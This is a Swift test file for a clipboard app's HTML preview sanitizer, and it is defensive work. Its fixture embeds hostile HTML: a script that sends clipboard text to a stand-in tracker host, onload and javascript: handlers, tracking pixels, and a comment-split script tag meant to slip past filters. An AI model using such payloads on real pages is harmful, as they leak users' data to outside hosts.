import AppKit
import XCTest
@testable import ClipboardHistoryApp

// 不覆盖管线：这一卷判的是 `DetailRenderPolicy` / `HtmlSanitizer` / `HtmlPreviewPolicy`
// 三处**纯函数**（决定、消毒、上限）。管线级的判据在
// `HtmlPreviewPipelineTests`（同一个文件里，从 `ClipboardEntry` 与 `DetailPreviewKind` 进入，
// 因为 AGENTS.md 定义完成标准第 1 条：修复的验收测试必须从产品入口进，不许只调内部纯函数）。
//
// 这一卷存在的理由（R335 / 用户点名"让右侧预览窗口支持 html 预览"）：
// HTML 与 Markdown 不一样 —— Markdown 是**我们自己解析**的文本，HTML 是**别人写的可执行文档**。
// 所以这条通道的所有权不是"能不能画出来"，而是"画的时候会不会替用户做他没点头的事"。
// 下面每一格都在钉这件事，而不是钉样式。

private let htmlFixture = """
<!DOCTYPE html>
<html><head>
  <meta charset="utf-8">
  <meta http-equiv="refresh" content="0;url=https://tracker.example/redirect">
  <link rel="stylesheet" href="https://cdn.example/style.css">
  <title>标题标签不该出现在正文里</title>
  <style>body { color: #123456; background: url(https://tracker.example/bg.png); }</style>
  <script>fetch('https://tracker.example/beacon?clip=' + encodeURIComponent(document.body.innerText))</script>
</head>
<body onload="steal()">
  <h1>季度报告</h1>
  <p style="color:#0a0;text-align:left">一段带<b>内联样式</b>与<em>强调</em>的正文。</p>
  <p><a href="https://example.com/doc">官方文档</a> 与 <a href="javascript:void(0)">假链接</a></p>
  <img src="https://tracker.example/pixel.gif?id=SECRET" width="1" height="1">
  <ul><li>甲</li><li>乙</li></ul>
  <iframe src="https://tracker.example/frame"></iframe>
  <div data-src="https://tracker.example/lazy.png" srcset="a.png 1x, b.png 2x">尾部段落</div>
  <p foo-src="https://tracker.example/unnamed">属性名不在名单里的那一种</p>
</body></html>
"""

@MainActor
final class HtmlPreviewPolicyTests: XCTestCase {

    // MARK: 决定（谁赢）

    func testThePrecedenceIsTheWholePoint() {
        // 夹具里刻意**不出现** `<html` 字面量：那会被文档判定先抓走，这一格要量的"载荷优先"就换成了对象。
        // （第一版就是踩了这个：写的是"正文与 <html> 无关"，结果两半都在判 HTML，Markdown 那一支从没被比过。）
        let markdownish = "# 标题\n\n- 甲\n\n一段带列表与标题的 Markdown 正文。\n"
        // ① 载荷是**声明**，纯文本只是投影 ⇒ 声明赢，即使投影长得像 Markdown。
        let withPayload = DetailRenderPolicy.decide(text: markdownish,
                                                   htmlPayload: Data("<p>x</p>".utf8))
        guard case .rendered(let renderer, let source) = withPayload else {
            return XCTFail("带 HTML 载荷的条目必须走渲染，实得 \(withPayload)")
        }
        XCTAssertEqual(renderer, .html)
        XCTAssertEqual(source, "<p>x</p>", "渲染的必须是载荷那一份字节，不是纯文本投影")

        // ② 没有载荷时，只有**文档级标记**才算 HTML。
        XCTAssertEqual(DetailRenderPolicy.decide(text: htmlFixture, htmlPayload: nil).renderer, .html)
        XCTAssertEqual(DetailRenderPolicy.decide(text: "<HTML><BODY>hi</BODY></HTML>",
                                                 htmlPayload: nil).renderer, .html,
                       "大小写不该改变判定（真实网页的 doctype 什么写法都有）")

        // ③ 一段"含标签的源码"不算文档：用户复制 HTML 源码时要的就是源码。
        let fragment = "<div class=\"card\">\n  <span>计数</span>\n</div>\n"
        XCTAssertFalse(HtmlPreviewPolicy.looksLikeHtmlDocument(fragment),
                       "只有小写标签、没有文档声明 ⇒ 不许把源码渲染掉（那一类误判由「原文」那颗控件兜）")
        XCTAssertEqual(DetailRenderPolicy.decide(text: fragment, htmlPayload: nil), .plain)

        // ④ Markdown 那一路不受影响（两半来自同一处，但互不吞并）。
        XCTAssertEqual(DetailRenderPolicy.decide(text: markdownish, htmlPayload: nil).renderer, .markdown)
        // ⑤ 什么都没有 ⇒ 没有入口。
        XCTAssertEqual(DetailRenderPolicy.decide(text: "只有一句话。", htmlPayload: nil), .plain)
    }

    func testEmptyPayloadIsNotAPayload() {
        // `richText.html` 在存档里是可选字段；**空 Data 不是"有 HTML"**。
        // 写成 `!= nil` 的话，一条带着空载荷的普通文本会得到一个渲染入口，
        // 而点下去画的是同一份字 —— 那正是"承诺做不到的动作"。
        let empty = DetailRenderPolicy.decide(text: "只有一句话。", htmlPayload: Data())
        XCTAssertEqual(empty, .plain, "空载荷必须等于没有载荷")
        XCTAssertEqual(DetailRenderPolicy.decide(text: "只有一句话。", htmlPayload: Data(" ".utf8)).renderer,
                       .html, "非空载荷即使是空白也算声明 —— 判定看的是字节存在性，不是内容")
    }

    func testTheByteCeilingIsDerivedFromTheMeasuredSlope() throws {
        // 上限不许是口味。这一格**当场量**斜率，再问"上限换算成主线程时间，超没超仓库自己那条预算"。
        // 预算取 `MotionCatalog.maximumDuration`：它是"一次交互动效最长允许多久"，
        // 拿它当"一次渲染最多按住主线程多久"的上界，是同一件事的两个方向（现读于 R335，账里写明）。
        let small = DetailRenderPolicy.decide(text: htmlFixture, htmlPayload: nil)
        guard let (smallRenderer, smallSource) = small.resolved(), smallRenderer == .html else {
            return XCTFail("夹具没走 HTML 渲染器，这一格就没有对象")
        }
        let bigBody = (0..<600).map { "<p>第 \($0) 段：一段足够长的中文正文用来把体量撑起来。</p>" }.joined()
        let bigSource = "<!doctype html><html><body>\(bigBody)</body></html>"
        XCTAssertFalse(HtmlPreviewPolicy.declinesForSize(bigSource),
                       "夹具本身要留在预算内，否则量到的是「拒绝」而不是代价")

        // **先热身，再取 5 次里的最小值**：`NSAttributedString(html:)` 第一次调用付的是 WebKit 初始化
        // （spike 现读 225.7ms，本机首跑 64.5ms），不热身的话"小的那一档"反而最贵、斜率是负的 ——
        // 第一版就是这么红的（R335 现读：同一格在一次全量卷里红、在另一次里绿）。
        // 取最小值而不是平均值：这台机器上唯一稳定的解释是" intrinsic 代价"，平均值会被并发污染。
        _ = HtmlRendering.attributedString(smallSource)
        _ = HtmlRendering.attributedString(bigSource)
        func best(_ source: String) -> Double {
            var ms = Double.greatestFiniteMagnitude
            for _ in 0..<5 { ms = min(ms, elapsedMs { _ = HtmlRendering.attributedString(source) }) }
            return ms
        }
        let smallMs: Double = best(smallSource)
        let bigMs: Double = best(bigSource)
        let smallBytes: Double = Double(smallSource.utf8.count)
        let bigBytes: Double = Double(bigSource.utf8.count)
        guard bigBytes > smallBytes, bigMs > smallMs else {
            return XCTFail("斜率量不出来：big=\(bigMs)ms/\(bigBytes)B small=\(smallMs)ms/\(smallBytes)B")
        }
        let msPerKB: Double = (bigMs - smallMs) / ((bigBytes - smallBytes) / 1000.0)
        let capBytes: Double = Double(HtmlPreviewRenderBudget.maximumBytes)
        let capMs: Double = msPerKB * capBytes / 1000.0
        let budgetMs: Double = MotionCatalog.maximumDuration * 1000.0
        let parts = [
            "HTML_RENDER_COST",
            "小=\(String(format: "%.1f", smallMs))ms/\(Int(smallBytes))B",
            "大=\(String(format: "%.1f", bigMs))ms/\(Int(bigBytes))B",
            "斜率=\(String(format: "%.3f", msPerKB))ms/KB",
            "上限=\(Int(capBytes))B≈\(String(format: "%.0f", capMs))ms",
            "预算=\(String(format: "%.0f", budgetMs))ms",
            "判定=\(capMs <= budgetMs ? "在预算内" : "超预算")",
        ]
        CaptureReadings.emit(parts.joined(separator: " "))
        XCTAssertGreaterThan(bigMs, smallMs, "两档代价分不开 ⇒ 这把尺没量到东西（空对账，R140）")
        XCTAssertLessThanOrEqual(capMs, budgetMs,
            "按现读斜率，\(Int(capBytes)) 字节的 HTML 要按住主线程 "
            + "\(String(format: "%.0f", capMs))ms，超过仓库自己那条 "
            + "\(String(format: "%.0f", budgetMs))ms 的动效预算 ⇒ 上限得降，或改成后台解析")
    }

    func testOversizedHtmlLosesTheEntryInsteadOfLyingAboutIt() {
        let huge = "<!doctype html><html><body>"
            + String(repeating: "<p>填满预算的一段中文正文。</p>", count: 40_000) + "</body></html>"
        XCTAssertTrue(HtmlPreviewPolicy.declinesForSize(huge))
        XCTAssertEqual(DetailRenderPolicy.decide(text: huge, htmlPayload: nil), .plain,
                       "超预算 ⇒ **整条入口都不给**。留着控件而点了没变化，就是承诺一个做不到的动作")
        // 载荷那一路同样受管（载荷优先不代表载荷无限）。
        XCTAssertEqual(DetailRenderPolicy.decide(text: "x", htmlPayload: Data(huge.utf8)), .plain)
    }

    func testHtmlFileEntriesOfferRenderingWhilePdfDoesNot() {
        let html = DetailRenderPolicy.decide(fileContent: "<p>正文</p>",
                                             url: URL(fileURLWithPath: "/tmp/合同.HTML"))
        XCTAssertEqual(html.renderer, .html, "扩展名大小写不该改变判定")
        XCTAssertEqual(DetailRenderPolicy.decide(fileContent: "# 标题",
                                                 url: URL(fileURLWithPath: "/tmp/a.md")).renderer, .markdown)
        XCTAssertEqual(DetailRenderPolicy.decide(fileContent: "x",
                                                 url: URL(fileURLWithPath: "/tmp/a.txt")), .plain,
                       "普通文本文件仍是等宽源码 —— 那是代码和日志，本来就要数着字符看")
        XCTAssertTrue(MarkdownRenderingAffordance.offers(for: .file(URL(fileURLWithPath: "/tmp/a.htm")),
                                                        exists: { _ in true }))
        XCTAssertFalse(MarkdownRenderingAffordance.offers(for: .file(URL(fileURLWithPath: "/tmp/a.pdf")),
                                                         exists: { _ in true }))
        XCTAssertFalse(MarkdownRenderingAffordance.offers(for: .file(URL(fileURLWithPath: "/tmp/a.html")),
                                                         exists: { _ in false }),
                       "文件已不在就没有两种看法（与 Markdown 那一路同一条规矩）")
    }
}

@MainActor
final class HtmlSanitizerTests: XCTestCase {

    func testEveryLoadableOrExecutableConstructIsGone() {
        let clean = HtmlSanitizer.sanitize(htmlFixture)
        let residue = HtmlSanitizer.residualFetchableReferences(clean)
        // "构造=" 是**数出来的**，不是手抄的：把同一颗尺放到原始样本上，问它认得出几种。
        // （写死一个数就是"读数里混进手抄"——那一格下一轮改了夹具也不会红。）
        let rawKinds = HtmlSanitizer.residualFetchableReferences(htmlFixture).count
        CaptureReadings.emit("HTML_SANITIZE 构造=\(rawKinds) 残留=\(residue.count) "
            + "名单=\(residue.isEmpty ? "无" : residue.joined(separator: ",")) "
            + "文本保留=\(clean.contains("季度报告") && clean.contains("尾部段落") ? "是" : "否")")
        XCTAssertEqual(residue, [],
            "消毒之后还剩这些东西 ⇒ 渲染一次就可能替用户发一个请求，而这个产品至今没有出网通道："
            + residue.joined(separator: ", "))
        // `foo-src` 是**故意起的名字**：它不在属性名单里、也不是 `data-*`，
        // 只有"除 href 外任何带 URL 的属性都去掉"那条兜底能抓它（刀 M974 的靶）。
        XCTAssertFalse(clean.contains("foo-src"), "兜底那条没生效：自定义属性名带 URL 漏出去了")
        for needle in ["<script", "<style", "<img", "<link", "<iframe", "<meta",
                       "tracker.example", "onload=", "javascript:", "url(", "foo-src"] {
            XCTAssertFalse(clean.lowercased().contains(needle), "残留了 \(needle)")
        }
    }

    func testTheVisibleTextSurvivesBecauseThatIsThePoint() {
        // 只判"危险的东西没了"是不够的：一刀切掉整个 body 也能过上一条。
        // 这一格钉的是**收益还在**：标题、正文、列表项、以及 `<a>` 的文字都得留着。
        let clean = HtmlSanitizer.sanitize(htmlFixture)
        for kept in ["季度报告", "内联样式", "强调", "官方文档", "假链接", "甲", "乙", "尾部段落"] {
            XCTAssertTrue(clean.contains(kept), "消毒把正文也吃掉了：\(kept)")
        }
        XCTAssertFalse(clean.contains("标题标签不该出现在正文里"), "<title> 的内容不该进正文")
        XCTAssertFalse(clean.contains("color: #123456"), "<style> 整块该没")
    }

    func testSanitizingIsIdempotent() {
        let once = HtmlSanitizer.sanitize(htmlFixture)
        let twice = HtmlSanitizer.sanitize(once)
        XCTAssertEqual(once, twice,
                       "第二遍又改了什么 ⇒ 第一遍留下了会被再处理的半成品（那种形状迟早会漏）")
    }

    func testInlineStyleKeepsColorsButLosesUrls() {
        let out = HtmlSanitizer.sanitize("<p style=\"color:#0a0; background:url(https://x/y.png); "
            + "text-align:left\">文</p>")
        XCTAssertTrue(out.contains("color:#0a0"),
                      "消毒只管「能不能被加载」，墨归渲染那一步管（`HtmlRendering.applySurfaceInk`）")
        XCTAssertTrue(out.contains("text-align:left"))
        XCTAssertFalse(out.contains("url("), "style 里的 url() 必须整条声明去掉")
        XCTAssertEqual(HtmlSanitizer.residualFetchableReferences(out), [])
    }

    func testRealHrefSurvivesBecauseClickingIsTheUsersCall() {
        let out = HtmlSanitizer.sanitize("<a href=\"https://example.com/doc\">文档</a>")
        XCTAssertTrue(out.contains("https://example.com/doc"),
                      "点链接是用户点头的动作，不是产品替他出网；而且 URL 本来就以文字显示在页面上")
        let js = HtmlSanitizer.sanitize("<a href=\"javascript:steal()\">点我</a>")
        XCTAssertFalse(js.contains("javascript:"), "伪协议不是链接，是脚本")
    }

    /// `<img>` 被撤掉之后，**它自己的说明文字必须留下**（R336 / BACKLOG 401）。
    ///
    /// 为什么这一格值得存在：R335 的消毒把 `<img>` 整块删掉是对的（产品零出网，
    /// 加载别人的图 = 替用户出网），但**后果**没人登记：一张以图为主的页面复制下来，
    /// 切到"渲染"会看到一块空白，而屏幕上没有任何一句话说明"这里原本有东西"。
    /// 修法不是发明一个占位符，而是照抄 HTML 自己的字段 —— `alt` 就是
    /// "这张图加载不了时该显示什么"。三条规则各自钉一发：有 alt 留文字、
    /// 空/缺 alt 整块删（装饰图与 1×1 埋点像素不配在屏幕上占位）、
    /// alt 里的尖括号必须剥掉（属性值会变成正文，不剥就是"从属性里爬回文档"）。
    func testImageAltTextSurvivesWhileTheImageItselfDoesNot() {
        let withAlt = HtmlSanitizer.sanitize(
            "<p>前</p><img src=\"https://tracker.example/chart.png\" alt=\"季度趋势图\"><p>后</p>")
        XCTAssertTrue(withAlt.contains("季度趋势图"), "有 alt 的图被撤掉之后，那一句说明也没了：\(withAlt)")
        XCTAssertFalse(withAlt.lowercased().contains("<img"), "标签本体必须删干净：\(withAlt)")
        XCTAssertFalse(withAlt.contains("https://"), "src 不许以文字或属性留下：\(withAlt)")
        XCTAssertEqual(HtmlSanitizer.residualFetchableReferences(withAlt), [],
                       "为了留 alt 而把可加载构造带回来 ⇒ 这一族的修法本身成了缺陷")

        let decorative = HtmlSanitizer.sanitize(
            "<p>前</p><img src=\"https://tracker.example/p.gif\" alt=\"\"><p>后</p>")
        XCTAssertFalse(decorative.contains("图片") || decorative.contains("图像"),
                       "空 alt 是作者声明的装饰图，不许替它发明占位文字：\(decorative)")
        XCTAssertEqual(decorative.replacingOccurrences(of: "<p>", with: "")
            .replacingOccurrences(of: "</p>", with: ""), "前后",
            "装饰图那一块应当**静默**消失：\(decorative)")
        let noAlt = HtmlSanitizer.sanitize("<p>前</p><img src=\"https://x/1.png\"><p>后</p>")
        XCTAssertFalse(noAlt.contains("img"), "没有 alt 的图（多半是埋点像素）整块删：\(noAlt)")

        // 反例要挑**能走到这一行**的形状：`<img … alt="a>b">` 里那个 `>` 会让标签正则
        // 先截断（`<img[^>]*/?>` 到第一个 `>` 就停），alt 根本不会被捕获 —— 那是另一条已知
        // 限制（BACKLOG 404 记的就是它），不是这一格要钉的东西。这里用只含 `<` 不含 `>` 的 alt。
        let hostile = HtmlSanitizer.sanitize(
            "<img src=\"https://x/1.png\" alt=\"甲<script乙\"><p>后</p>")
        XCTAssertFalse(hostile.lowercased().contains("<script"),
                       "alt 里的尖括号没剥掉 ⇒ 属性值爬回了文档：\(hostile)")
        XCTAssertTrue(hostile.contains("甲") && hostile.contains("乙"),
                       "剥掉尖括号之后那句说明还是要留：\(hostile)")
        XCTAssertEqual(HtmlSanitizer.residualFetchableReferences(hostile), [])

        // **已知限制的现状断言**（BACKLOG 404）：`alt` 里含 `>` 会让标签正则先截断
        // （`<img[^>]*/?>` 到第一个 `>` 就停），于是 alt 没被捕获、剩下的属性文字漏进正文。
        // 这里断言的是"今天就是这样"，不是"这样对"：将来有人把它修掉，这一格会红，
        // 而他必须同时去改 404 —— 一条被钉住的限制不会悄悄变成"从来没存在过"。
        let gtLeak = HtmlSanitizer.sanitize("<img src=\"https://x/1.png\" alt=\"a>b\"><p>后</p>")
        XCTAssertTrue(gtLeak.contains("b\">"),
                      "现状变了 ⇒ 先回 BACKLOG 404 更正，再改这一格：\(gtLeak)")
        XCTAssertFalse(gtLeak.lowercased().contains("<img"),
                       "标签本体仍然要删干净：\(gtLeak)")
        XCTAssertEqual(HtmlSanitizer.residualFetchableReferences(gtLeak), [],
                       "这条限制不许顺带打开一条出网通道：\(gtLeak)")

        // 幂等：替换之后不再有 `<img>`，第二遍必须一个字节都不动。
        for sample in [withAlt, decorative, noAlt, hostile] {
            XCTAssertEqual(HtmlSanitizer.sanitize(sample), sample,
                           "第二遍又改了东西 ⇒ 第一遍留下了会被再处理的半成品")
        }
        CaptureReadings.emit("HTML_ALT 有alt保留=\(withAlt.contains("季度趋势图")) "
            + "空alt静默=\(!decorative.contains("图片")) 无alt删净=\(!noAlt.contains("img")) "
            + "尖括号剥掉=\(!hostile.lowercased().contains("<script"))")
    }

    /// `alt` 必须是**这个标签自己那个** alt —— R337 复盘时从源码读出来的形状，R338 量到并修。
    ///
    /// 第一版取 alt 用的是 `\balt\s*=`，而 ICU 的词边界把 `data-alt` 里那个 `alt` 也算起点
    /// （`-` 是非词字符），于是 `<img data-alt="埋点说明" alt="真说明">` 取到的是**埋点属性**的文字。
    /// 那是"屏幕上出现作者没打算给人读的一句话"，与 D-332 的方向正好相反：
    /// 这条通道只该留作者为"图加载不了"准备的那一份。
    /// 同族第二种形状更隐蔽：`title="见 alt=假的"` 里那个空格会喂饱 `\s` ⇒
    /// 光要求"前面是空白"不够，必须按**属性对**扫、名字整段等于 alt 才算。
    func testAltIsTakenFromTheTagsOwnAttributeNotFromAPrefixedNameOrAnotherValue() {
        let prefixed = HtmlSanitizer.sanitize(
            "<p>前</p><img src=\"https://x/1.png\" data-alt=\"埋点说明\" alt=\"真说明\"><p>后</p>")
        XCTAssertTrue(prefixed.contains("真说明"),
                      "作者写的那个 alt 被前缀属性抢走了：\(prefixed)")
        XCTAssertFalse(prefixed.contains("埋点说明"),
                       "屏幕上出现了作者没打算给人读的一句（data-alt 的值）：\(prefixed)")
        XCTAssertEqual(HtmlSanitizer.residualFetchableReferences(prefixed), [],
                       "为了抢回 alt 不许把可加载构造带回来：\(prefixed)")

        let insideValue = HtmlSanitizer.sanitize(
            "<p>前</p><img src=\"https://x/2.png\" title=\"见 alt=假的\" alt=\"真说明\"><p>后</p>")
        XCTAssertTrue(insideValue.contains("真说明"),
                      "值里那个假 alt 把真 alt 挤掉了：\(insideValue)")
        XCTAssertFalse(insideValue.contains("假的"),
                       "别的属性的**值**里含 alt= 时不许被当成 alt：\(insideValue)")

        // 上面那一格在**旧实现**下恰好是绿的（`alt=假的` 后面没有引号，旧正则要引号才认）。
        // 所以这一格把值换成带引号的形状：旧实现会从这里爬出"假的"，
        // 而按属性对扫的实现认得 title 的名字 ⇒ 不许靠巧合过关。
        let quotedInside = HtmlSanitizer.sanitize(
            "<p>前</p><img src=\"https://x/5.png\" title='见 alt=\"假的\"' alt=\"真说明\"><p>后</p>")
        XCTAssertTrue(quotedInside.contains("真说明"),
                      "单引号 title 里那个带引号的 alt= 抢走了真 alt：\(quotedInside)")
        XCTAssertFalse(quotedInside.contains("假的"),
                       "别的属性的值里含 alt=\"…\" 时不许被当成 alt：\(quotedInside)")

        // 名字整段相等才算 ⇒ 重复属性取第一个（与 HTML 一致），单引号照样要认。
        let duplicated = HtmlSanitizer.sanitize(
            "<img src=\"https://x/3.png\" alt=\"第一个\" alt=\"第二个\"><p>后</p>")
        XCTAssertTrue(duplicated.contains("第一个") && !duplicated.contains("第二个"),
                      "重复 alt 的取舍必须与规范一致（第一个作数）：\(duplicated)")
        let singleQuoted = HtmlSanitizer.sanitize(
            "<img src='https://x/4.png' alt='单引号说明'><p>后</p>")
        XCTAssertTrue(singleQuoted.contains("单引号说明"),
                      "单引号属性值必须照样认：\(singleQuoted)")
        CaptureReadings.emit("HTML_ALT_SOURCE 前缀属性没抢=\(prefixed.contains("真说明")) "
            + "值里的假alt没抢=\(insideValue.contains("真说明") && !insideValue.contains("假的")) "
            + "带引号的值没抢=\(quotedInside.contains("真说明") && !quotedInside.contains("假的")) "
            + "重复取第一个=\(duplicated.contains("第一个") && !duplicated.contains("第二个")) "
            + "单引号认=\(singleQuoted.contains("单引号说明"))")
    }

    /// 图被撤之后那句说明**落在哪个块里**（R336 / 规则 ④）。
    ///
    /// 上一格只保证"文字留下"，而屏幕上量到的是：留下的是裸行内文字时，它会并进上一个块的行节奏
    /// —— 真帧现读它与下一段之间 20.0pt（= 列表自己的行内距），两个 `<p>` 之间是 32.0pt。
    /// 也就是说 ①〜③ 做对了，读起来仍然像"列表漏了一颗项目符号"。
    /// 两半都要钉，因为两种坏法在屏幕上是相反的：从不包段 ⇒ 说明与下一段挤成一段；
    /// 永远包段 ⇒ 句子里的图把一句话劈成三段。
    func testStandaloneImageBecomesItsOwnParagraphWhileInlineImageStaysInline() {
        let standalone = HtmlSanitizer.sanitize(
            "<ul><li>甲</li></ul>\n  <img src=\"https://x/1.png\" alt=\"图一\">\n  <p>下一段</p>")
        XCTAssertTrue(standalone.contains("<p>图一</p>"),
                      "独占一行的图被撤之后，那句说明必须自成一段：\(standalone)")

        let inline = HtmlSanitizer.sanitize(
            "<p>见图 <img src=\"https://x/2.png\" alt=\"图一\"> 说明</p>")
        XCTAssertFalse(inline.contains("<p>图一</p>"),
                       "句中的图不许被升格成段落 —— 那会把一句话劈成三段：\(inline)")
        XCTAssertTrue(inline.contains("见图") && inline.contains("说明"),
                      "就地替换之后前后文字仍要在同一句里：\(inline)")
        XCTAssertFalse(inline.lowercased().contains("<img"), "标签本体仍然删干净：\(inline)")

        for sample in [standalone, inline] {
            XCTAssertEqual(HtmlSanitizer.sanitize(sample), sample,
                           "包出来的 <p> 会被第二遍再处理 ⇒ 幂等破了：\(sample)")
            XCTAssertEqual(HtmlSanitizer.residualFetchableReferences(sample), [],
                           "为了排版加一个块级标签，不许顺带把可加载构造带回来：\(sample)")
        }
        CaptureReadings.emit("HTML_ALT_BLOCK 独占成段=\(standalone.contains("<p>图一</p>")) "
            + "句中不包=\(!inline.contains("<p>图一</p>")) "
            + "句中同句=\(inline.contains("见图") && inline.contains("说明"))")
    }

    func testCommentHidingAScriptDoesNotReviveIt() {
        // 两支规则谁先跑都会改变另一支的输入 ⇒ 顺序是判据，不是实现细节。
        let tricky = "<!-- <img src=\"https://x/1.png\"> --><p>正文</p><scri<!-- -->pt>alert(1)</scri<!-- -->pt>"
        let out = HtmlSanitizer.sanitize(tricky)
        XCTAssertTrue(out.contains("正文"))
        XCTAssertFalse(out.lowercased().contains("https:"), "注释里的可加载构造不许漏出去")
    }

    func testEmptyAndGarbageInputsDoNotProduceAHalfPage() {
        XCTAssertEqual(HtmlSanitizer.sanitize(""), "")
        XCTAssertNil(HtmlRendering.attributedString(""))
        XCTAssertNil(HtmlRendering.attributedString(HtmlSanitizer.sanitize("")))
    }
}

/// 从**产品入口**进来的那一半（AGENTS.md 定义完成标准第 1 条）。
@MainActor
final class HtmlPreviewPipelineTests: XCTestCase {

    private func entry(_ text: String, html: Data? = nil) -> ClipboardEntry {
        ClipboardEntry(content: .text(text), timestamp: Date(timeIntervalSince1970: 1_700_000_000),
                       thumbnail: nil, sourceURL: nil, sourceUTIs: ["public.html"],
                       sourceAppBundleID: "com.apple.Safari", sourceAppName: "Safari",
                       richText: html.map { RichTextPayload(rtf: nil, html: $0) })
    }

    func testTheViewTypeIdentityFollowsTheRealViewSwitch() {
        let e = entry("正文", html: Data(htmlFixture.utf8))
        XCTAssertEqual(DetailPreviewKind(entry: e, markdownMode: .rendered), .renderedText)
        XCTAssertEqual(DetailPreviewKind(entry: e, markdownMode: .source), .rawText,
                       "切换确实换掉整块子视图（属性串 ↔ 纯文本）⇒ 类型身份必须跟着翻")
        // 关键的一条：HTML **不新增** case。它换的是渲染器，不是视图。
        let md = entry("# 标题\n\n- 甲\n")
        XCTAssertEqual(DetailPreviewKind(entry: md, markdownMode: .rendered),
                       DetailPreviewKind(entry: e, markdownMode: .rendered),
                       "Markdown 与 HTML 用的是同一块视图 ⇒ 多一个 case 就是一条永不执行的承诺")
    }

    func testTheHelpTextIsNotALieOnEitherRenderer() {
        // `.helpLabel` 同时喂 `.help` 与 `accessibilityLabel` ⇒ 说错的那一句会被 VoiceOver 念出来。
        let htmlHelp = DetailRenderer.html.controlHelp(htmlPayload: false)
        let mdHelp = DetailRenderer.markdown.controlHelp(htmlPayload: false)
        XCTAssertFalse(htmlHelp.contains("Markdown"), "HTML 条目的提示语里不该出现 Markdown：\(htmlHelp)")
        XCTAssertTrue(mdHelp.contains("Markdown"), "Markdown 那条要保持原话（已有判据锚着它）")
        XCTAssertNotEqual(htmlHelp, mdHelp)
    }

    /// 提示语必须**跟着条目变**，而不是跟着渲染器枚举变（R335 第二版补的一格）。
    ///
    /// 为什么单独一格：`HtmlPreviewPolicy.controlHelp(hasPayload:)` 从第一版起就有两支，
    /// 而 `DetailRenderer.controlHelp` 把参数写死成 `false` ⇒ 另一支**永远走不到**，
    /// 上面那格还照样全绿（它只测了"两种渲染器话不一样"）。这一族叫**函数有两个分支而调用点只喂一个常量**：
    /// 判据看不见、帧也看不见，只有从条目那一侧问一次才接得上。刀 M983 钉的就是"退回常量"。
    /// 顺带把 `.html` **文件**条目那一格钉住：第一版它的提示语写的是 Markdown（假话）。
    func testTheHelpFollowsTheEntryNotJustTheRenderer() {
        let payload = Data("<p>富格式本体</p>".utf8)
        let withPayload = DetailRenderPolicy.controlHelp(
            for: .text("<p>这是一份 HTML 文档</p>"), htmlPayload: payload, exists: { _ in true })
        let withoutPayload = DetailRenderPolicy.controlHelp(
            for: .text("<p>这是一份 HTML 文档</p>"), htmlPayload: nil, exists: { _ in true })
        XCTAssertTrue(withPayload.contains("自带"), "带载荷的条目要说清渲染的是它自带的表示：\(withPayload)")
        XCTAssertFalse(withoutPayload.contains("自带"),
                       "没有载荷却说'自带的 HTML 表示'就是假话：\(withoutPayload)")
        XCTAssertNotEqual(withPayload, withoutPayload, "两支回答一样 ⇒ 参数没接上，这一格退化成上一格的复本")

        let htmlFile = DetailRenderPolicy.controlHelp(
            for: .file(URL(fileURLWithPath: "/tmp/页面.html")), htmlPayload: nil, exists: { _ in true })
        XCTAssertFalse(htmlFile.contains("Markdown"),
                       ".html 文件的提示语不许说 Markdown（第一版就是这样，而它不在任何帧里）：\(htmlFile)")
        let mdFile = DetailRenderPolicy.controlHelp(
            for: .file(URL(fileURLWithPath: "/tmp/说明.md")), htmlPayload: nil, exists: { _ in true })
        XCTAssertTrue(mdFile.contains("Markdown"))

        // 混着两种的那一条：说任何一种都对另一半撒谎 ⇒ 必须退回中性那句。
        let mixed = DetailRenderPolicy.controlHelp(
            for: .files([URL(fileURLWithPath: "/tmp/说明.md"), URL(fileURLWithPath: "/tmp/页面.html")]),
            htmlPayload: nil, exists: { _ in true })
        XCTAssertFalse(mixed.contains("Markdown"), mixed)
        XCTAssertFalse(mixed.contains("HTML"), mixed)
        XCTAssertEqual(mixed, DetailRenderPolicy.mixedControlHelp)

        // 文件不在了 ⇒ 没有两种看法，也就没有"这句该说什么"的问题：退回默认那句。
        let gone = DetailRenderPolicy.controlHelp(
            for: .file(URL(fileURLWithPath: "/tmp/页面.html")), htmlPayload: nil, exists: { _ in false })
        XCTAssertEqual(gone, MarkdownPreviewMode.controlHelp)
        CaptureReadings.emit("HTML_HELP 带载荷=是 无载荷=是 混排中性=\(mixed == DetailRenderPolicy.mixedControlHelp) "
            + "html文件不说Markdown=\(!htmlFile.contains("Markdown"))")
    }

    /// 「有没有入口」这一问也必须是同一处答案，并且**看得见载荷**。
    func testRenderersSetIsTheSingleAuthority() {
        let text = "<!DOCTYPE html><html><p>甲</p></html>"
        XCTAssertEqual(DetailRenderPolicy.renderers(for: .text(text), htmlPayload: nil, exists: { _ in true }),
                       [.html])
        XCTAssertEqual(DetailRenderPolicy.renderers(for: .text("普通一句话"),
                                                    htmlPayload: Data("<p>x</p>".utf8),
                                                    exists: { _ in true }), [.html],
                       "载荷是声明，它必须能把一条'看起来不像 HTML'的文本也变成有入口")
        XCTAssertTrue(DetailRenderPolicy.renderers(for: .file(URL(fileURLWithPath: "/tmp/a.pdf")),
                                                   htmlPayload: nil, exists: { _ in true }).isEmpty,
                      "PDF 没有'渲染 / 原文'两种看法 —— 它走的是另一块预览视图")
        XCTAssertTrue(DetailRenderPolicy.renderers(for: .files([URL(fileURLWithPath: "/tmp/a.pdf")]),
                                                   htmlPayload: nil, exists: { _ in true }).isEmpty)
        XCTAssertEqual(DetailRenderPolicy.renderers(for: .files([URL(fileURLWithPath: "/tmp/a.md"),
                                                                 URL(fileURLWithPath: "/tmp/b.html")]),
                                                    htmlPayload: nil, exists: { _ in true }),
                       [.markdown, .html], "混排必须被**数出来**，而不是被第一支掩盖")
    }

    func testTheRendererIsPartOfTheCacheKey() {
        // 同一段字节换渲染器时，"内容"没换。只按文本判重 ⇒ 屏幕上切了个空操作，
        // 而它看起来像成功了（这一格是 R335 的刀 M975 的靶）。
        XCTAssertNotEqual(DetailRenderer.markdown.cacheKeyPrefix, DetailRenderer.html.cacheKeyPrefix)
        XCTAssertFalse(DetailRenderer.markdown.cacheKeyPrefix.isEmpty,
                       "前缀给空串 ⇒「没有渲染器」与「Markdown」在键上同形")
        XCTAssertFalse(DetailRenderer.html.cacheKeyPrefix.hasPrefix(DetailRenderer.markdown.cacheKeyPrefix),
                       "一个前缀包住另一个 ⇒ 拼出来的键可能撞")
    }

    func testRenderedSourceIsAlwaysTheSanitizedOne() {
        let decision = DetailRenderPolicy.decide(text: htmlFixture, htmlPayload: nil)
        guard let (renderer, source) = decision.resolved(), renderer == .html else {
            return XCTFail("夹具没走 HTML")
        }
